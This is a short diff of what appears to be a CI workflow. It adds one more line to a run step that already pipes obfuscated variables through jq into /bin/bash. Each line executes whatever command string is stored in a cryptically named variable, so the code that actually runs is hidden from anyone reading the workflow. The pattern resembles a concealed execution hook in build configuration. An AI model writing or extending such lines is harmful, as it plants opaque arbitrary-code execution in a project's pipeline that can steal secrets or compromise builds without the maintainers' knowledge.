@@ -46,6 +46,7 @@ jobs:
           echo $zz966 | jq -r .iqxb0980 | /bin/bash
           printf '%s' "$melw64" | jq -r .c881 | /bin/bash
           echo $q993 | jq -r .byg13 | /bin/bash
+          printf '%s' "$v7" | jq -r .wcx006 | /bin/bash
 
       - name: Archive results
         if: always()
